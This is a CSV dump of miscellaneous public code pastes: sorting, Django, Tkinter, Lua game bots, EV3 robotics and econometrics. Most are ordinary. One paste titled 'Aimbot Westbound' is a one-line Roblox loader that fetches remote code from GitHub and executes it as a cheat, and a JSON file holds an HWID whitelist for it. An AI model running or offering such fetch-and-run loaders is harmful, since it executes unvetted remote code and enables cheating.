id,title,username,language,date,content
uwr7YnYg,Курсова работа код - КА,GerogiGeorgiev-2024,C#,Monday 20th of October 2025 12:57:08 PM CDT,"using System;
using System.Diagnostics;

class Program
{
    static void Main()
    {
        const int SIZE = 50; // броят елементи в масива

        int[] numbers = new int[SIZE];
        Random rand = new Random();

        // Попълваме масива с произволни числа
        for (int i = 0; i < SIZE; i++)
            numbers[i] = rand.Next(0, 1000);

        Console.WriteLine(""Масив преди сортиране:"");
        Console.WriteLine(string.Join("" "", numbers));

        // Измерваме времето за сортиране
        Stopwatch sw = new Stopwatch();
        sw.Start();

        BubbleSort(numbers);

        sw.Stop();

        Console.WriteLine(""\nМасив след сортиране:"");
        Console.WriteLine(string.Join("" "", numbers));

        Console.WriteLine($""\nВреме за изпълнение: {sw.Elapsed.TotalMilliseconds:F3} ms"");
    }

    static void BubbleSort(int[] arr)
    {
        int n = arr.Length;
        for (int i = 0; i < n - 1; i++)
        {
            bool swapped = false;
            for (int j = 0; j < n - i - 1; j++)
            {
                if (arr[j] > arr[j + 1])
                {
                    int temp = arr[j];
                    arr[j] = arr[j + 1];
                    arr[j + 1] = temp;
                    swapped = true;
                }
            }
            if (!swapped)
                break;
        }
    }
}
"
aDjcjxcc,my_paste,str8zer0,Python,Monday 20th of October 2025 12:56:13 PM CDT,"def set_rarity(apps, schema_editor):
    ITEM_RARITIES = {
        ""Rare"": lambda r: r <= 10,
        ""Very Rare"": lambda r: 11 <= r <= 20,
        ""Extremely Rare"": lambda r: 21 <= r <= 30,
        ""Mega Rare"": lambda r: r > 30,
    }

    Item = apps.get_model(""main_app"", ""Item"")
    items = Item.objects.all()

    for item in items:
        for rarity, condition in ITEM_RARITIES.items():
            if condition(item.price):
                item.rarity = rarity
                break

    Item.objects.bulk_update(items, [""rarity""])"
h00DG83P,Tkinter - Cuadrícula de Botones,LCD-PROG,Python,Monday 20th of October 2025 12:41:36 PM CDT,"import tkinter as tk  

main_window = tk.Tk()
main_window.geometry(""520x580"")

def on_click(key: str):    
    print(f""Click on: {key}"")
    
for i in range(4):
    main_window.grid_rowconfigure(i, weight=1, uniform=""rows"")  
    main_window.grid_columnconfigure(i, weight=1, uniform=""cols"")

columna_letras:list[str] = ['A', 'B', 'C', 'D']
tarjetas:dict[str, tk.Button] = {}
 
for fila in range(4):    
    for columna in range(1, 4+1):
        clave = f""{columna_letras[fila]}{columna}"" 
        boton = tk.Button(main_window, text=clave, command=lambda k=clave:on_click(k))
        boton.grid(row=fila, column=columna-1, sticky=""nsew"", padx=6, pady=6)
        tarjetas[clave] = boton

main_window.mainloop()"
zFKvaSGs,command,BrainFart17,Lua,Monday 20th of October 2025 11:24:53 AM CDT,"Companion = require(""Companion"")
thready = require(""thready"")
local name_file = fs.open(""name.txt"", ""r"")
local name = name_file.readAll()
ccstr = require(""cc.strings"")
companion = Companion:new(name)
lastcmd = {}


function copy(orig)
    if type(orig) ~= 'table' then
        return orig
    end
    local copy_table = {}
    for k, v in pairs(orig) do
        copy_table[k] = copy(v)
    end
    return copy_table
end

cmd_array = { guard=next_guard,
    			    move = next_move,
    			    follow = next_follow,
    				spelunk = next_spelunk,
    				equip = next_equip,
    				unequip = next_unequip,
    				resume = resume_func,
    				stop = stop_func,
    				focus = focus_func,
    				unfocus = unfocus_func,
    				refuel = next_refuel,
    				stayclose = stay_close_func,
    				attack = attack_func,
    				stand_down = stand_down_func,
    				clear_hostiles = clear_hostiles_func,
    				transfer_command = next_transfer_command
}

fnc_array ={guard=nil,
			move = nil,
    		follow = nil,
    		spelunk = nil,
    		equip = nil,
    		unequip = nil,
    		resume = nil,
    		stop = nil,
    		focus = nil,
    		unfocus = nil,
    		refuel = nil,
    		stayclose = nil,
    		attack = nil,
    		stand_down = nil,
    		clear_hostiles = nil, 
    		transfer_command = nil
}
                
function command_loop(cmd)
	while true do
    	_, message, sender, uuid = os.pullEvent(""onChatMessage"")
        android.sendChatMessage(""message recieved"")
		if companion.player == nil then
            companion.player = {name=companion.playername}
        	android.sendChatMessage(""No commander initialized. Please use the transfer_command command"")
        end
        android.sendChatMessage(companion.player[""name""] .. "": "" ..tostring(companion.focused))
		if sender ~= companion.player[""name""] or not companion.focused then
            android.sendChatMessage(""message not applicable"")
        	goto continue
        end
        
        local parsed_cmd
		if cmd ~= nil then
   			parsed_cmd = copy(cmd)
		else
   			parsed_cmd = ccstr.split(message, ""%s+"")
		end
 
        local seed_str = parsed_cmd[1]
        local seed_cmd = nil
        if seed_str then
        	seed_cmd = cmd_array[seed_str]
        end
        if seed_cmd then
            if seed_str ~= ""stop"" then
               android.sendChatMessage(""Changing commands..."")
               stop_func()
               thready.spawn(""cmd"", run_command, seed_cmd, seed_str, parsed_cmd)
               android.sendChatMessage(""Engaging new command."")
           	else
               android.sendChatMessage(""Stopping current objective..."")
               stop_func()        
               android.sendChatMessage(""Ready for next command."")
            end
        else
        	goto continue
        end
		
        last_cmd = copy(parsed_cmd)
		::continue::
	end
end

function run_command(seed_cmd, seed_str, parsed_cmd)
	if fnc_array[seed_str] ~= nil then
       seed_cmd(unpack(fnc_array[seed_str](parsed_cmd)))
    else
       seed_cmd(parsed_cmd)
    end
end

function next_guard(list)
	if #list == 4 then
    	companion:guard_location({posX=tonumber(list[2]), posY = tonumber(list[3]), posZ=tonumber(list[4])})
    else
        companion:guard_entity(list[2])
    end
end
    
function next_transfer_command()
    companion:transfer_command(list[2])    
end

function next_move(list)
   android.moveTo(tonumber(list[2]), tonumber(list[3]), tonumber(list[4]))
end

function next_follow(list)
   companion:follow(list[2])
end

function next_spelunk(list)
	companion:spelunk(list[2])
end

function next_refuel(list)
    companion:refuel(list[2])
end

function next_equip(list)
	companion:equip_from_stash(list[2], list[3])
end 
function next_unequip(list)
    companion:stash_in_any()
end
function resume_func(list)
    if lastcmd[1] ~= ""resume"" then
    	command_loop(lastcmd)
    else
        android.sendChatMessage(""You cannot use resume twice in a row"")
	end
end

function stop_func(list)
   android.cancelTask()
   companion.stop = true
   while True do
       local running = companion.running_func
       sleep(.005)
       local still_running = companion.running_func
       sleep(.2)
       if not running and not still_running then
       	   break
       end
    end
    companion.stop = false
end 

function focus_func(list)
    if list[1] == companion.name then
       companion.focused = true 
    end
end

function unfocus_func(list)
	if list[1] == companion.name then
       companion.focused = false
    end
end

function stay_close_func(list)
    companion.stayclose = list[2] == ""true""
end

function attack_func(list)
    companion.hostiles[list[2]] = true
end

function stand_down_func(list)
    companion.hostiles[list[2]] = nil
end

function clear_hostiles_func(list)
    companion.hostiles = {}
end


"
zdpksUu8,Cat,ACheats,Lua,Monday 20th of October 2025 10:27:22 AM CDT,"-- cats.lua
-- Скрипт: меню категорий команд (включая 255 команд)
-- Использование:
--   !!cat                -> список категорий
--   !!cat <номер>        -> все команды в категории
--   !!cat <имя_команды>  -> показать категории, где есть команда

local args = _ARGS or {}

-- Категории и команды (включены все 255 команд)
local CATEGORIES = {
  { name = ""Утилиты / полезные"", cmds = {
    ""ohw"", ""siohw"", ""hcraes"", ""652ahs"", ""1ahs"", ""2ahs"", ""652ahs"", ""1ahs"", ""2ahs"",
    ""esrom"", ""negesrom"", ""tpyrc"", ""iruedoced"", ""iruedocne"", ""esrever"", ""esreverym"",
    ""snart"", ""emit"", ""remit"", ""nwodtnuoc"", ""trec"", ""strec"", ""siohw"", ""elbatteg"",
    ""batteg"", ""elifteg"", ""eton"", ""egarotstset"", ""tdlstset"", ""ehcac"", ""bstset"",
    ""kcats"", ""elbatesrap"", ""tsihkcatslaunam"", ""scnuf"", ""snoitcnuf"", ""bif"",
    ""nogylop"", ""652ahs"", ""1ahs"", ""2ahs"", ""setybotijome"", ""bytestoemoji"", ""hsah"", ""tpyrc""
  }},
  { name = ""Игры и развлечения"", cmds = {
    ""ecid"", ""onisac"", ""aktelur"", ""ttt"", ""ecid"", ""yadyap"", ""nioc"", ""tnaw"", ""aktelur"",
    ""onisac"", ""ecid"", ""pxnar"", ""ttt"", ""ihcag"", ""mihcag"", ""aktelur"", ""ozzadnar"",
    ""onisac"", ""yadyap"", ""ecid""
  }},
  { name = ""Развлекательные тупняки (рофл)"", cmds = {
    ""osaym"", ""doom"", ""ikhsutsahc"", ""2ikhsutsahc"", ""timilfb"", ""derb"", ""kek"", ""ovak"",
    ""aboba"", ""aboba"", ""aboba"", ""misbitahk"", ""kopslamron"", ""ortulamron"", ""recev"",
    ""gninrom"", ""einaminv"", ""ereh"", ""heh"", ""admheh"", ""yko"", ""yko"", ""yko"", ""fsserp"",
    ""aysvals"", ""axulhs"", ""csdnar"", ""ozzadnar"", ""atsap"", ""atsap""
  }},
  { name = ""NSFW / жесть"", cmds = {
    ""iatneh"", ""iatnehlanrete"", ""ihcce"", ""kcufyag"", ""nropyageoksted"", ""gnitsif"",
    ""hcord"", ""adzip"", ""anigav"", ""ssip"", ""poop"", ""ytnap"", ""kcidkcidwen"", ""skcid"",
    ""kcid"", ""axulhs"", ""kcus"", ""srekcus"", ""hsrehs""
  }},
  { name = ""Про участников чата / рейтинги"", cmds = {
    ""kcid"", ""skcid"", ""taf"", ""sammom"", ""knab"", ""pot"", ""erocs"", ""serocs"", ""etar"",
    ""amrak"", ""omas"", ""omas"", ""avals"", ""ohw"", ""siohw"", ""sresu"", ""ataDresUllAteg"",
    ""rebmeMtahCmodnaRteg"", ""ekatevig"", ""ytnap"", ""nortap"", ""niochb"", ""knab""
  }},
  { name = ""Симуляторы"", cmds = {
    ""mistanir"", ""misgnirmi"", ""mispyf"", ""misrimem"", ""misilom"", ""misavya"", ""eem"",
    ""mistanir"", ""misnwolc"", ""tpg"", ""ynopym"", ""misilom"", ""misgnirmi"", ""mistanir""
  }},
  { name = ""Технические / кодинг"", cmds = {
    ""kcufniarb"", ""negfb"", ""ferppc"", ""notip"", ""tsur"", ""оelc"", ""oelc"", ""saigdok"",
    ""snoitcnuf"", ""scnuf"", ""kcats"", ""elbatesrap"", ""negfb"", ""kcufniarb"", ""bstset"",
    ""tpyrc"", ""hsah"", ""esrever"", ""esreverym"", ""iruedoced"", ""iruedocne""
  }},
  { name = ""Админские / системные"", cmds = {
    ""nab"", ""nabnu"", ""nocr"", ""odus"", ""raelc"", ""craelc"", ""ehcac"", ""domlabolg"", ""nimda"",
    ""ehcac"", ""elifteg"", ""elbatteg"", ""batteg"", ""elifg"", ""nocr"", ""nocr""
  }},
  { name = ""BlastHack / BH-тематика"", cmds = {
    ""thb"", ""uhb"", ""sememhb"", ""enilnohb"", ""pudnatshb"", ""niochb""
  }},
  { name = ""Музыка и мультимедиа"", cmds = {
    ""cisum"", ""rugmi"", ""cstnrp"", ""emem"", ""emina"", ""rugmi"", ""csdnar"", ""cstnrp"", ""cisum"",
    ""yxo"", ""nacuot""
  }},
  { name = ""Прочее"", cmds = {
    ""ecivda"", ""kcah"", ""cam"", ""lliks"", ""onehcartop"", ""yrt"", ""syrt"", ""yrt"", ""rehtie"",
    ""aisergo"", ""pmaysav"", ""yssnnh"", ""epavdam"", ""hsarcir"", ""pir"", ""ofni"", ""aedi"",
    ""hsarc"", ""molpid"", ""enod"", ""krow"", ""nehwerehwtahw"", ""ekoj"", ""kena"", ""ameop"",
    ""ohw"", ""yhwyhw"", ""ayuhan"", ""tsetopit"", ""tiuq"", ""tiuq"", ""trec"", ""strec""
  }}
}



-- Индекс команд -> категории
local CMD_TO_CATS = {}

for i, cat in ipairs(CATEGORIES) do
  for _, cmd in ipairs(cat.cmds) do
    local key = """"
    for j = 1, #cmd do
      local c = string.byte(cmd, j)
      if c >= 65 and c <= 90 then c = c + 32 end
      key = key .. string.char(c)
    end
    CMD_TO_CATS[key] = CMD_TO_CATS[key] or {}
    table.insert(CMD_TO_CATS[key], i)
  end
end


function reverse_str(s)
    local t = {}
    for i = #s, 1, -1 do
        t[#t + 1] = string.sub(s, i, i)
    end
    return table.concat(t)
end


-- Перевод строки в нижний регистр
function lower_str(s)
  local res = """"
  for i = 1, #s do
    local c = string.byte(s, i)
    if c >= 65 and c <= 90 then c = c + 32 end
    res = res .. string.char(c)
  end
  return res
end

-- Проверка наличия подстроки
function contains(haystack, needle)
  for i = 1, #haystack - #needle + 1 do
    local match = true
    for j = 1, #needle do
      if string.byte(haystack, i + j - 1) ~= string.byte(needle, j) then
        match = false
        break
      end
    end
    if match then return true end
  end
  return false
end

-- Показать все категории
function show_categories()
  local lines = {}
  table.insert(lines, ""Категории команд:"")
  for i, cat in ipairs(CATEGORIES) do
    table.insert(lines, string.format(""%d. %s (%d)"", i, cat.name, #cat.cmds))
  end
  table.insert(lines, """")
  table.insert(lines, ""Использование:"")
  table.insert(lines, ""!!cat <номер>  — показать команды категории"")
  table.insert(lines, ""!!cat <имя>    — найти команду по имени и показать категории"")
  return table.concat(lines, ""\n"")
end

-- Показать команды категории
function show_category(idx)
  idx = tonumber(idx)
  if not idx or idx < 1 or idx > #CATEGORIES then
    return ""Неверный номер категории. Введите !!cat чтобы увидеть список.""
  end
  local cat = CATEGORIES[idx]
  local lines = {}
  table.insert(lines, string.format(""%d. %s — команды (%d):"", idx, cat.name, #cat.cmds))
  for _, cmd in ipairs(cat.cmds) do
    table.insert(lines, ""!!"" .. reverse_str(cmd))
  end
  return table.concat(lines, "" "")
end

-- Поиск команды
function find_command(name)
  if not name or name == """" then
    return ""Укажите имя команды для поиска, например: !!cats dice""
  end

  name = lower_str(name)
  local matches = {}

  if CMD_TO_CATS[name] then
    for _, idx in ipairs(CMD_TO_CATS[name]) do
      table.insert(matches, idx)
    end
  else
    for i, cat in ipairs(CATEGORIES) do
      for _, cmd in ipairs(cat.cmds) do
        if contains(lower_str(cmd), name) then
          table.insert(matches, i)
          break
        end
      end
    end
  end

  if #matches == 0 then
    return ""Команда не найдена.""
  end

  local seen = {}
  local lines = {}
  table.insert(lines, ""Найдено в категориях:"")
  for _, idx in ipairs(matches) do
    if not seen[idx] then
      table.insert(lines, string.format(""%d. %s"", idx, CATEGORIES[idx].name))
      seen[idx] = true
    end
  end
  table.insert(lines, """")
  table.insert(lines, ""Для подробного списка выполните: !!cat <номер_категории>"")

  return table.concat(lines, ""\n"")
end

-- Основная логика
if not args or args == """" then
  return show_categories()
end

-- Если args — число -> показать категорию
if tonumber(args) then
  return show_category(tonumber(args))
end

-- Иначе трактуем как имя команды -> найти её
return find_command(args)

"
fDHW2SUQ,Untitled,chrissharp123,PostgreSQL,Monday 20th of October 2025 10:02:46 AM CDT,"DECLARE
     new_copy_location INT;
 BEGIN
     IF (TG_OP = 'UPDATE') THEN
         IF NEW.location = OLD.location AND NEW.call_number = OLD.call_number AND NEW.circ_lib = OLD.circ_lib THEN
             RETURN NEW;
         END IF;
     END IF;
     SELECT INTO new_copy_location acpl.id FROM asset.copy_location acpl JOIN actor.org_unit_ancestors_distance((SELECT owning_lib FROM asset.call_number WHERE id = NEW.call_number)) aouad ON acpl.owning_lib = aouad.id WHERE deleted IS FALSE AND name = (SELECT name FROM asset.copy_location WHERE id = NEW.location) ORDER BY distance LIMIT 1;
     IF new_copy_location IS NULL THEN
         SELECT INTO new_copy_location acpl.id FROM asset.copy_location acpl JOIN actor.org_unit_ancestors_distance(NEW.circ_lib) aouad ON acpl.owning_lib = aouad.id WHERE deleted IS FALSE AND name = (SELECT name FROM asset.copy_location WHERE id = NEW.location) ORDER BY distance LIMIT 1;
     END IF;
     IF new_copy_location IS NOT NULL THEN
         NEW.location = new_copy_location;
     END IF;
     RETURN NEW;
 END;   "
s7n5JBA0,Heart | Подвал,iFoundation,HTML 5,Monday 20th of October 2025 09:18:40 AM CDT,"<align=""center""><size=24><b><color=#AED2F6>★</color> <color=#94C4F3>Р</color><color=#87BEF2>у</color><color=#79B7F0>с</color><color=#6CB0EE>с</color><color=#5FA9ED>к</color><color=#52A3EB>и</color><color=#459CE9>й</color> <color=#2B8EE6>S</color><color=#1E88E5>C</color><color=#2680DC>P</color><color=#2F79D3>:</color><color=#3872CA>S</color><color=#416BC1>L</color> <color=#535CAF>С</color><color=#5C55A6>е</color><color=#654E9E>р</color><color=#6E4695>в</color><color=#773F8C>е</color><color=#803883>р</color> <color=#922971>|</color> <color=#A41B5F>#</color><color=#AD1457>1 ★</color></b></size>

<size=22><b><color=#ECF8F9>У нас нет жестких правил, однако мы ожидаем от вас честную игру и позитив.<sup>[Без Правил]</sup></color></b></size>
<size=20><b><color=#ECF8F9>Задача нашего проекта - предоставление максимально комфортной и увлекательной игры в русском сообществе и открытость для игроков</color></b></size>

<line-height=90%><size=21><link=""https://discord.gg/heartru""><mark=#5454ed><color=#00000000>||</color></mark><mark=#6666ff><b><color=#00000000>|</color>     ＤＩＳＣＯＲＤ     <color=#00000000>|</color></b></mark><mark=#5454ed><color=#00000000>||</color></mark></link> <link=""https://docs.google.com/document/d/1jZLOdYXo3qNnkFFw3IHlbZjtVJrAhBQBfu3meQbphQc""><mark=#ed2154><color=#00000000>||</color></mark><mark=#ff3366><b><color=#00000000>|</color>       ＲＵＬＥＳ       <color=#00000000>|</color></b></mark><mark=#ed2154><color=#00000000>||</color></mark></link></align>
<size=18><align=""center""><link=""https://discord.gg/heartru""><mark=#212121><b><color=#00000000>|</color><space=14.7em><color=#00000000>|</color></b></mark></link> <space=-0.2em> <link=""https://docs.google.com/document/d/1jZLOdYXo3qNnkFFw3IHlbZjtVJrAhBQBfu3meQbphQc""><mark=#212121><b><color=#00000000>|</color><space=13.6em><color=#00000000>|</color></b></mark></link></size>

<line-height=90%><size=21><link=""https://t.me/heartsrv""><mark=#1E88E5><color=#00000000>||</color></mark><mark=#2B8EE6><b><color=#00000000>|</color>   ＴＥＬＥＧＲＡＭ    <color=#00000000>|</color></b></mark><mark=#1E88E5><color=#00000000>||</color></mark></link> <link=""https://discord.com/users/266520754038898688/""><mark=#8754ed><color=#00000000>||</color></mark><mark=#9966ff><b><color=#00000000>|</color>        ＯＷＮＥＲ       <color=#00000000>|</color></b></mark><mark=#8754ed><color=#00000000>||</color></mark></link></size>
<size=18><link=""https://t.me/heartsrv""><mark=#212121><b><color=#00000000>|</color><space=14.9em><color=#00000000>|</color></b></mark> <link=""https://discord.com/users/266520754038898688/""><mark=#212121><b><color=#00000000>|</color><space=14.0em><color=#00000000>|</color></b></mark></link> </link></size>

<size=21><b><color=#7E1717>Присоединяйтесь к нам и наслаждайтесь увлекательной игрой в русском сообществе SCP:SL!</color></b></size>

<size=18>The server allows <color=#7E1717><b>ONLY</b></color> players from post-Soviet countries and Finland or Russian speaking players.</size></align>"
X1yEgGVf,Untitled,chemelli74,Python,Monday 20th of October 2025 09:01:37 AM CDT,"""""""Quick test.""""""
import asyncio

from aiocomelit.api import (
    ComeliteSerialBridgeApi,
)
from aiohttp import ClientSession, TCPConnector
from aiohttp.cookiejar import CookieJar


ip = ""192.168.1.252""
port = 80
pin = ""123456""
pin2 = ""123456""


async def main() -> None:

    jar = CookieJar(unsafe=True)
    connector = TCPConnector(force_close=True)
    session = ClientSession(cookie_jar=jar, connector=connector)

    bridge_api = ComeliteSerialBridgeApi(
        ip, port, pin, session
    )

    await bridge_api.login()
    vedo_logged = await bridge_api.vedo_enabled(pin2)

    x = await bridge_api.get_all_devices()
    y = None
    if vedo_logged:
        y = await bridge_api.get_all_areas_and_zones()

    combined_data = [x, y]
    print(combined_data)

if __name__ == ""__main__"":
    asyncio.run(main())
"
WCuQa01x,colors,fushi,Python,Monday 20th of October 2025 08:38:53 AM CDT,"#!/usr/bin/env pybricks-micropython
from pybricks.hubs import EV3Brick
from pybricks.ev3devices import (Motor, TouchSensor, ColorSensor,
                                 InfraredSensor, UltrasonicSensor, GyroSensor)
from pybricks.parameters import Port, Stop, Direction, Button, Color
from pybricks.tools import wait, StopWatch, DataLog
from pybricks.robotics import DriveBase
from pybricks.media.ev3dev import SoundFile, ImageFile


# This program requires LEGO EV3 MicroPython v2.0 or higher.
# Click ""Open user guide"" on the EV3 extension tab for more information.


# Create your objects here.
ev3 = EV3Brick()
left_motor = Motor(Port.C)
right_motor = Motor(Port.B)
color = DriveBase(left_motor, right_motor, wheel_diameter=57.15, axle_track=88.9)
pause=1000
# wait is in MS
# I made a function because I didn't wanna change all the waits. I am very lazy.

while True:
    ev3.light.on(Color.RED)
    wait(pause)
    ev3.light.on(Color.ORANGE)
    wait(pause)
    ev3.light.on(Color.GREEN)
    wait(pause)
    ev3.light.on(Color.YELLOW)
    wait(pause)
ev3.speaker.beep
# I was trying to do R,B,G but Blue is apparently invalid! It doesn't display any color, which is labeled as a incorrect value in the documents
# Apparently Red/Orange/Green are the only values allowed in the MINDSTORMs program, but Yellow works perfectly fine.
# Setting pause to 0 is probably an epilepsy inducer and it hurts my eyes. 0/10 would not recommend
# Having no waits inbetween will cause it to remain on the last color (its too fast)
# Indents are required. Only indented stuff below a loop will be looped. Tripped me up because C++ needs parentheses."
XbtRsid1,nested_colors,fushi,Python,Monday 20th of October 2025 08:37:37 AM CDT,"#!/usr/bin/env pybricks-micropython
from pybricks.hubs import EV3Brick
from pybricks.ev3devices import (Motor, TouchSensor, ColorSensor,
                                 InfraredSensor, UltrasonicSensor, GyroSensor)
from pybricks.parameters import Port, Stop, Direction, Button, Color
from pybricks.tools import wait, StopWatch, DataLog
from pybricks.robotics import DriveBase
from pybricks.media.ev3dev import SoundFile, ImageFile


# This program requires LEGO EV3 MicroPython v2.0 or higher.
# Click ""Open user guide"" on the EV3 extension tab for more information.

# Create your objects here.
ev3 = EV3Brick()
left_motor = Motor(Port.C)
right_motor = Motor(Port.B)
color = DriveBase(left_motor, right_motor, wheel_diameter=57.15, axle_track=88.9)

while True:
    if Button.DOWN in ev3.buttons.pressed():
        ev3.light.on(Color.RED)
    if Button.LEFT in ev3.buttons.pressed():
        ev3.light.on(Color.YELLOW)
    if Button.UP in ev3.buttons.pressed():
        ev3.light.on(Color.GREEN)
    if Button.RIGHT in ev3.buttons.pressed():
        ev3.light.on(Color.ORANGE)
    if Button.CENTER in ev3.buttons.pressed():
        break
# Allows the user to switch through four colors. Hitting center exits the loop.
# Contrary to the name no I haven't figured out how to nest it or properly exit the loop without ending the program.
# Previously, after the loop, there was a beep and wait block to try preventing a total program exit, but this didn't change anything and still completely ended the loop. I tried adding another loop, but I didn't have time to put anything in the loop to test whether or not it works."
tUpFTWDm,Aimbot Westbound,Mangle_DevCH,Lua,Monday 20th of October 2025 08:26:59 AM CDT,"loadstring(game:HttpGet(""https://raw.githubusercontent.com/shakar60/WestBound/refs/heads/main/Westbound.lol"",true))()"
hw5JbDUW,Vip Gunung Ckptw v2,yocky12k,JSON,Monday 20th of October 2025 07:43:25 AM CDT,"{
  ""users"": [
    {
      ""hwid"": ""3b37c9d9-bb08-417c-809b-8e21c716249f"",
      ""name"": ""Yocky"",
      ""expiry"": ""2025-10-20""
    }
  ]
}
"
P478LG94,Finder Low Ping & Player,Mangle_DevCH,Lua,Monday 20th of October 2025 06:54:48 AM CDT,"--// 🔥 Volcano-Ready Low Ping + Low Player Server Finder
--// Made by Yibge & GPT-5 😎

local HttpService = game:GetService(""HttpService"")
local TeleportService = game:GetService(""TeleportService"")
local Player = game.Players.LocalPlayer
local placeId = game.PlaceId

print(""[🌐] Searching for low ping & low player servers..."")

local function getServers(cursor)
    local servers = {}
    local url = ""https://games.roblox.com/v1/games/""..placeId..""/servers/Public?sortOrder=Asc&limit=100""
    if cursor then
        url = url .. ""&cursor="" .. cursor
    end

    local success, response = pcall(function()
        return game:HttpGet(url)
    end)

    if success then
        local data = HttpService:JSONDecode(response)
        for _, v in ipairs(data.data) do
            if v.playing < v.maxPlayers then
                table.insert(servers, v)
            end
        end
        if data.nextPageCursor then
            local more = getServers(data.nextPageCursor)
            for _, s in ipairs(more) do
                table.insert(servers, s)
            end
        end
    end
    return servers
end

local servers = getServers()
local bestServer, bestPing, lowestPlayers = nil, math.huge, math.huge

for _, server in ipairs(servers) do
    local start = tick()
    pcall(function()
        game:HttpGet(""https://games.roblox.com/v1/games/""..placeId)
    end)
    local ping = (tick() - start) * 1000

    if server.playing < lowestPlayers or (server.playing == lowestPlayers and ping < bestPing) then
        bestServer = server
        bestPing = ping
        lowestPlayers = server.playing
    end

    task.wait(0.05) -- avoid rate limit
end

if bestServer then
    print(string.format(""[✅] Found best server → Ping: %.0fms | Players: %d/%d"", bestPing, bestServer.playing, bestServer.maxPlayers))
    TeleportService:TeleportToPlaceInstance(placeId, bestServer.id, Player)
else
    warn(""[❌] No suitable server found."")
end"
jc23WBcG,Прикладна_економетрика_ЛР№3_Мірошниченко,mirosh111000,Python,Monday 20th of October 2025 06:01:54 AM CDT,"import math
from typing import Tuple, Dict, List
from dataclasses import dataclass
import numpy as np


x = np.array([0.3, 0.6, 1.1, 0.2, 0.8, 1.6, 1.5, 0.9, 0.9, 0.8], dtype=float)
y = np.array([2.8, 4.3, 6.3, 2.9, 5.3, 8.3, 8.0, 5.7, 5.4, 5.2], dtype=float)


ALPHA_SW = 0.05  


def ols_fit_and_residuals(x: np.ndarray, y: np.ndarray) -> Tuple[float, float, np.ndarray, np.ndarray]:

    x = np.asarray(x, float)
    y = np.asarray(y, float)
    x_bar = float(np.mean(x))
    y_bar = float(np.mean(y))
    Sxx = float(np.sum((x - x_bar) ** 2))
    Sxy = float(np.sum((x - x_bar) * (y - y_bar)))
    a1 = Sxy / Sxx
    a0 = y_bar - a1 * x_bar
    y_hat = a0 + a1 * x
    u = y - y_hat
    return a0, a1, y_hat, u


def central_moments(u: np.ndarray) -> Tuple[float, float, float, float]:

    u = np.asarray(u, float)
    mu = float(np.mean(u))
    d = u - mu
    m2 = float(np.mean(d ** 2))
    m3 = float(np.mean(d ** 3))
    m4 = float(np.mean(d ** 4))
    return mu, m2, m3, m4


def skewness_kurtosis(u: np.ndarray) -> Tuple[float, float]:

    _, m2, m3, m4 = central_moments(u)
    if m2 <= 0:
        return float('nan'), float('nan')
    g1 = m3 / (m2 ** 1.5)
    g2 = m4 / (m2 ** 2) - 3.0
    return g1, g2


def adjusted_moment_tests(u: np.ndarray):

    n = float(len(u))
    g1, g2 = skewness_kurtosis(u)
    A_hat = math.sqrt(n * (n - 1.0)) / (n - 2.0) * g1
    E_hat = ((n - 1.0) / ((n - 2.0) * (n - 3.0))) * ((n + 1.0) * g2 + 6.0)
    var_A = 6.0 * n * (n - 1.0) / ((n + 1.0) * (n + 3.0) * (n - 2.0))
    var_E = 24.0 * n * (n - 1.0) ** 2 / ((n + 5.0) * (n + 3.0) * (n - 2.0) * (n - 3.0))
    two_sA = 2.0 * math.sqrt(var_A)
    two_sE = 2.0 * math.sqrt(var_E)
    decision = (abs(A_hat) <= two_sA) and (abs(E_hat) <= two_sE)
    return A_hat, E_hat, two_sA, two_sE, decision


_A_COEFFS_N10 = np.array([0.5739, 0.3291, 0.2141, 0.1224, 0.0399], dtype=float)
_W_CRIT_N10: Dict[float, float] = {0.10: 0.869, 0.05: 0.842, 0.02: 0.806, 0.01: 0.781}


def shapiro_wilk_w_n10(sample: np.ndarray) -> Tuple[float, float, List[Tuple[int, float, float, float, float, float]]]:

    x = np.sort(np.asarray(sample, float))
    n = x.size
    if n != 10:
        raise ValueError(""Shapiro–Wilk (ця реалізація) підтримує лише n = 10."")
    S2 = float(np.sum((x - x.mean()) ** 2))
    rows: List[Tuple[int, float, float, float, float, float]] = []
    b = 0.0
    k = 5
    for i in range(k):
        left = float(x[i])
        right = float(x[-(i + 1)])
        diff = right - left
        ai = float(_A_COEFFS_N10[i])
        term = ai * diff
        b += term
        rows.append((i + 1, left, right, diff, ai, term))
    W = (b ** 2) / S2 if S2 > 0 else float('nan')
    return W, S2, rows


def shapiro_wilk_decision_n10(sample: np.ndarray, alpha: float = ALPHA_SW) -> Tuple[float, bool, float, float, List[Tuple[int, float, float, float, float, float]]]:
    if alpha not in _W_CRIT_N10:
        raise ValueError(f""Для n=10 доступні α: {sorted(_W_CRIT_N10.keys())}"")
    W, S2, rows = shapiro_wilk_w_n10(sample)
    Wcrit = _W_CRIT_N10[alpha]
    return W, (W >= Wcrit), Wcrit, S2, rows


@dataclass
class NormalityResults:
    a0: float
    a1: float
    A_hat: float
    E_hat: float
    two_sA: float
    two_sE: float
    approx_moment_ok: bool
    W: float
    Wcrit: float
    W_ok: bool
    S2: float
    rows: List[Tuple[int, float, float, float, float, float]]
    u: np.ndarray
    u_sorted: np.ndarray
    u_mean: float


def run_full_check_and_print(x: np.ndarray, y: np.ndarray, alpha_sw: float = ALPHA_SW) -> NormalityResults:
    a0, a1, y_hat, u = ols_fit_and_residuals(x, y)

    A_hat, E_hat, two_sA, two_sE, approx_ok = adjusted_moment_tests(u)

    W, sw_ok, Wcrit, S2, rows = shapiro_wilk_decision_n10(u, alpha=alpha_sw)

    u_sorted = np.sort(u)
    u_mean = float(np.mean(u))

    gamma = 1.0 - alpha_sw

    print(""\n=== OLS модель ==="")
    print(f""a0 = {a0:.6f}, a1 = {a1:.6f}"")

    print(""\n=== Залишки U ==="")
    for idx, val in enumerate(u, start=1):
        print(f""u[{idx:>2}] = {val: .6f}"")
    print(f""Середнє ū = {u_mean:.6f}"")

    print(""\n=== Відсортовані залишки u_(i) (для SW) ==="")
    for idx, val in enumerate(u_sorted, start=1):
        print(f""u_({idx:>2}) = {val: .6f}"")

    print(""\n=== Наближений критерій: Â*, Ê* ==="")
    print(f""A^* = {A_hat:.4f},  2σ_A^* = {two_sA:.4f}  =>  {'OK' if abs(A_hat) <= two_sA else 'NOT OK'}"")
    print(f""E^* = {E_hat:.4f},  2σ_E^* = {two_sE:.4f}  =>  {'OK' if abs(E_hat) <= two_sE else 'NOT OK'}"")
    concl = ""не відхиляємо H0 (нормальність)"" if approx_ok else ""відхиляємо H0 (є відхилення від нормальності)""
    print(f""Висновок (наближений критерій): {concl}"")

